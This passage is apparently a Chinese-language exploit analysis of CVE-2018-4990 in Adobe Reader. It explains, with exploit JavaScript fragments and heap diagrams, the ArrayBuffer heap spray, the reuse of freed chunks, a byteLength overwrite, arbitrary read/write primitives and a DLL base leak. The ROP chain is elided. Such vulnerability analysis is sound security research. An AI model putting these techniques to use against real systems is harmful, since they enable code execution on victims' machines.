
```
for(var i1 = 1; i1 < l1 ; i1 = i1 + 2)
{
delete a1[i1];
a1[i1] = null;
}
```

紧接着解析 jpeg 图片，图片实际大小恰好为 `0x3f4` 字节，解析时会占用上述一个空闲的 `0x400` 堆块，随后触发漏洞，解析逻辑会将图片末尾的每个 4 字节内存当作地址去释放，一共释放到 图片内存基地址 + `0x3fc`(`max_count = 0xff`) 为止。因为图片大小只有 `0x3f4`，所以利用代码需要控制 `0x3f4` 开始的4个字节和 `0x3f8` 开始的 4 个字节，也就是 `0x400` 区域内倒数第 3 个 DWORD 和 倒数第2个 DWORD，我们来看一下示意图：

这是原先 `Uint32ArrayObject.buffer`

```
[249] = spraybase; // 倒数第 3 个 DWORD
[250] = spraybase+0x10000 // 倒数第 2 个 DWORD
// 以下区域的总大小为 0x400 字节
---------------------------------
| 0x10 head |
---------------------------------
| 0 ~ 248 |
---------------------------------
| [248] | [249] | [250] | [251] |
---------------------------------
```

这是漏洞触发时 jpeg 图片的内存，图片数据只占用 `0x3f4` 字节，漏洞导致 `0x3f4` 开始的 4 字节和 `0x3f8` 开始的4字节对应的两个地址被释放，恰好是 原来对应的 `[249]` 和 `[250]` 两个成员，所以利用代码选择 `Uint32Array(252)` 并设置 `[249]` 和 `[250]` 两个值为被释放的内存。

```
0x3f4 ~ 0x3f7 // 倒数第 3 个 DWORD
0x3f8 ~ 0x3fb // 倒数第 2 个 DWORD
// 以下区域的总大小为 0x400 字节，[3f0] 代表从 0x3f0 开始的 4 字节，后面同理
---------------------------------
| jpeg |
| data |
---------------------------------
| [3f0] | [3f4] | [3f8] | [3fc] |
---------------------------------
// 原图片实际用到的内存 0x3f4 字节
---------------------------------
| jpeg |
| data |
---------------------------------
| [3f0] |
---------
```

### 问题2：如何理解 `0x10000-24`，`0x20000-24`和`0x10000-12`?

为什么堆喷射时需要用 `ArrayBuffer(0x10000-24)` ？

```
var spraylen = 0x10000-24;
...
for(var i1 = 1; i1 < spraynum; i1++)
{
sprayarr[i1] = new ArrayBuffer(spraylen);
}
```

回答：堆喷射时用 `ArrayBuffer(0x10000-24)` 去进行喷射，通过前面的对象调试我们已经知道，这句代码每执行一次会申请 `0xffe8` 字节的 buffer，加上 `0x10` 的头部，其实际分配的内存大小为 `0xfff8`，再加上 `0x08` 的 `HEAP_ENTRY` 数据，其实际占用的空间大小为 `0x10000` 字节。

```
-----------------
| HEAP_ENTRY(8) |
---------------------------------
| buffer head (0x10) |
---------------------------------
| buffer (0xffe8) |
---------------------------------
```

为什么重新占位的时候需要用 `ArrayBuffer(0x20000-24)` ？

```
for(var i1 = 1; i1 < 0x40; i1++)
{
sprayarr2[i1] = new ArrayBuffer(0x20000 - 24);
}
```

回答：触发漏洞后，`0x0d0e0048` 和 `0x0d0f0048` 处两个相邻的 `0x10000` 大小内存块被释放并合并，此过程中回收的内存示意如下：

```
// 回收前
-----------------
0x0d0e0040 -> | HEAP_ENTRY(8) |
---------------------------------
| buffer head (0x10) |
---------------------------------
| buffer (0xffe8) |
---------------------------------
-----------------
0x0d0f0040 -> | HEAP_ENTRY(8) |
---------------------------------
| buffer head (0x10) |
---------------------------------
| buffer (0xffe8) |
---------------------------------
// 回收后，空闲内存大小 = (0x10 + 0xffe8) * 2 + 0x08 = 0x1fff8
-----------------
0x0d0e0040 -> | HEAP_ENTRY(8) | <- 这个 HEAP_ENTRY 的 8 字节被更新后继续使用
---------------------------------
| |
| |
| -----------------
| 0x0d0f0040 -> | HEAP_ENTRY(8) | <- 堆块合并后，这个 HEAP_ENTRY 的 8 字节被回收了
---------------------------------
| |
| |
---------------------------------
```

所以回收后的空闲内存为 `0x1fff8`，而 `ArrayBuffer(0x20000-24)` 会申请一段大小为 `0x1ffe8` 的 buffer 区域和一个 `0x10` 的头部，加起来恰好 `0x1fff8`。

为什么改写 `ArrayBufferObject` 的长度时改写的区域是 `0x10000-12` ？

```
for(var i1 = 1; i1 < spraynum; i1++)
{
if( sprayarr[i1].byteLength == 0x20000 - 24)
{
var biga = new DataView(sprayarr[i1]);
biga.setUint32(0x10000 - 12, 0x66666666);
for(var i11 = i1; i11 < spraynum; i11++)
{
if(sprayarr[i11].byteLength == 0x66666666)
{
i1 = i11;
biga = new DataView(sprayarr[i1]);
break;
}
}
```

回答：显然，利用代码想改写的字段为某个 `ArrayBuffer.buffer` 对应 head 中的 `byteLength` 成员。那么 `0x10000-12` 肯定对应着这个成员，我们来看一下：

```
0x10000 - 12 = 0xfff4
0xffe8 + 8 + 4 = 0xfff4
```

第一个 buffer 大小为 `0xffe8`，再加上 8 字节的 `HEAP_ENTRY`，来到原先第二个 buffer 的 head，再加上 4，跳过 head 的第1个成员，而 head 的第 2 个成员恰好就是 `byteLength`，从而将其改写为 `0x66666666`。

```
-----------------
0x0d0e0040 -> | HEAP_ENTRY(8) |
---------------------------------
| buffer head (0x10) |
---------------------------------
| buffer (0xffe8) |
---------------------------------
0x0d0f0040 -> | HEAP_ENTRY(8) |
---------------------------------
| buffer head (0x10) |
---------------------------------
| buffer (0xffe8) |
---------------------------------
---------------------------------------
buffer head = 0x0d0f0048 | | 0x66666666 | | |
---------------------------------------
buffer = 0x0d0f0058 | (origin_size = byteLength) |
.....
// 这里再回顾一下 ArrayBufferObject.buffer 的结构
// ArrayBufferObject.buffer 指向一片 buffer 区域，buffer 前有 0x10 字节的头部：
第 1 行每 1 格代表 4 字节
---------------------------------------
buffer head | | byteLength | | |
---------------------------------------
buffer | (size = byteLength) |
.....
```

### 对后续代码的进一步说明

```
var arr1 = new Array(0x10000);
for(var i2 = 0x10; i2 < 0x10000; i2++)
arr1[i2] = new Uint32Array(1);
for(var i2 = 1; i2 < 0x10; i2++)
{
// 继续申请若干 buffer 大小为 0x10000-24 的 Uint32Array 对象，使用超长 buffer 后紧邻的 15 个 buffer 去初始化 Uint32Array.buffer
arr1[i2] = new Uint32Array(sprayarr[i1 + i2]);
arr1[i2][0] = i2; // 将相应 buffer 的首 4 字节初始化为对应序号
}
// 起始搜索地址为 0x0d0f0058 + 0x30000 = 0x0d120058，此时对应序号为 3 的 buffer 首字节，从这个地址开始往后搜索，正常来说序号为 4 的 buffer 就满足条件
for(var i2 = 0x30000; i2 < 0x10000 * 0x10; i2 = i2 + 4)
{
-----------------------------------------------------------------------
Uint32ArrayObject.buffer
以下每 1 格代表 4 个字节
------------------------------------------------------
buffer-0x10 | |byteLength|ptr_to_Uint32ArrayObject| length |
------------------------------------------------------
buffer | [0] | [1] | [2] | [3] |
-----------------------------------------------------------------------
// 查找刚刚申请的其中一个满足 byteLength == spraylen 且 ptr_to_Uint32ArrayObject > spraypos(0x0d0f0058) 的 Uint32ArrayObject
if( biga.getUint32(i2, true) == spraylen && biga.getUint32(i2 + 4, true) > spraypos )
{
mydv = biga;
// 按照上述代码逻辑，itmp 正常应该为 4 ，实际调试时确实如此
// 0:011> dd 0d130050-8
// 0d130048 00000000 0000ffe8 1a299138 00000000
// 0d130058 00000004 00000000 00000000 00000000
// ...
var itmp = mydv.getUint32(i2 + 12, true);
// myarray 即为 Uint32ArrayObject for R/W
myarray = arr1[itmp];
// biga.getUint32(i2 + 4,true) - spraypos + 0x50 = Uint32ArrayObject.buffer = mypos = addr for R/W primitives
mypos = biga.getUint32(i2 + 4, true) - spraypos + 0x50;
// set Uint32ArrayObject.byteLength = 0x100000
mydv.setUint32(mypos - 0x10, 0x100000, true);
// myarraybase is for restore
// myarraybase 正常应该为 0x0d130058
myarraybase = mydv.getUint32(mypos, true);
var rop1 = [...];
// obj1 = Unit32ArrayObject
var obj1 = myread(myarraybase - 8);
// obj2 = poi(Unit32ArrayObject + 4)
var obj2 = myread(obj1 + 4);
// obj3 = poi(obj2), obj3 处于 Unit32ArrayObject 对象的虚函数表(IDA 中可以看到)
var obj3 = myread(obj2);
var dll_base = (myread(obj3 + 8) - 0x00010000 ) & 0xffff0000;
```

### DataView 任意地址读写原语

```
function myread(addr)
{
mydv.setUint32(mypos, addr, true); // 替换 Uint32ArrayObject.buffer 为 addr
var res = myarray[0]; // 读取 addr 开始的 4 字节
mydv.setUint32(mypos, myarraybase, true); // 还原 Uint32ArrayObject.buffer
return res;
}
function mywrite(addr, value)
{
mydv.setUint32(mypos, addr, true); // 替换 Uint32ArrayObject.buffer 为 addr
myarray[0] = value ; // 将 value 写入 addr 开始的 4 字节
mydv.setUint32(mypos, myarraybase, true); // 还原 Uint32ArrayObject.buffer
}
```

## 为什么是 `0x0d0e0048`?

### Windows下的`HEAP_SEGMENT`

想必大家看到 `CVE-2018-4990` 的利用代码后都会有这个问题：为什么 `ArrayBuffer` 的堆喷射会精准喷射到 `0x0d0e0048` 的位置且且此位置恰好为 `ArrayBuffer.buffer` 的 head 起始处。

实际调试发现，Adobe Reader 会在内存中 commit 一些较大的堆块，大小为 `0xfc1000`，在这些堆块的起始处有一个大小为 `0x48` 的头部，这 `0x48` 字节其实是一个 `HEAP_SEGMENT(0x40`字节) 加一个紧邻的 `HEAP_ENTRY(0x08`字节) 。（此处感谢代码疯子前辈指导）
